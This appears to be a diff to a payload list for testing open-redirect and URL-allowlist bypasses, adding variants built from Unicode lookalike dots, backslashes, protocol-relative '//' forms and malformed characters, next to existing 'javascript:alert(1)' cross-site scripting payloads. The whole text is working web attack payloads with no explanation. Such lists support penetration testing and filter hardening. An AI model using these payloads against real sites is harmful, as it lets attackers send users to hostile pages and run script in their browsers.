@@ -509,7 +509,11 @@ javascript:alert(1)//https://www.whitelisteddomain.tld
 //.@.@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 javascript:new%20Function`al\ert\`1\``;
 %09Jav%09ascript:alert(1)
-http://localdomain｡pw\ᵗwww.whitelisteddomain.tld
-http://www.whitelisteddomain.tld｡₨/
+https://localdomain｡pw\ᵗwww.whitelisteddomain.tld
+//localdomain｡pw\ᵗwww.whitelisteddomain.tld
+https://www.whitelisteddomain.tld｡₨/
+//www.whitelisteddomain.tld｡₨/
 https://localdomain.pw\udfff@www.whitelisteddomain.tld/
+//localdomain.pw\udfff@www.whitelisteddomain.tld/
 https://localdomain.pw�@www.whitelisteddomain.tld/
+//localdomain.pw�@www.whitelisteddomain.tld/
